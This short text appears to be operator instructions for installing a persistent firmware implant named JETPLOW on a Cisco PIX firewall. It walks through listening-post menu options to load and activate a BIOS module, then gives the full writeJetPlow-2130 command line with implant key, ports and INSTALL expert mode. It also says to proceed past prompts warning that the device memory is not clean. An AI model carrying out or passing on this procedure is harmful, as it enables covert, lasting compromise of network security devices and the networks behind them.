# Now we have to load the bios module to the pix, so we can write to it.
# Connect up to the PIX with the LP.
Option 1 to connect.
Option 31 to load module

#### NOTE: 
# The bios module you want is the biosModule_....mod. The three versions are based on 
# the version of BIOS the pix has. You usually need the AM29F.mod module. If you 
# upload the wrong BIOS, don't worry, it won't crush anything.

Choose Option 32 to activate the module.
Choose Option 9 to close out of the session
Choose Option 0 to close the lp

# Now we are ready to jetplow the pix. You should still be in the lp directory.
# Run binary without options to get usage

./writeJetPlow-2130

# Now actually run it:
# The only way to do a jetplow upgrade is to use the INSTALL operation mode and use expert mode.

./writeJetPlow-2130 --lp 127.0.0.1 --implant 127.0.0.1 --idkey project.key --sport 23435 --dport 45453 --readCmd 18 --writeCmd 19 --operation INSTALL --dir jetplow --expert --platform PIX###

# You will see defaults, just press enter through them, if you get an error,
# seek help

# Now you should get 3 prompts. This is because the script is looking at the 
# memory on the pix and expecting it to have a clean IOS install. Since we have 
# jetplow or speedplow there already, it's not clean. So we need to just proceed anyway.


JETPLOW Installation Operation - Successful.


## And we are done.
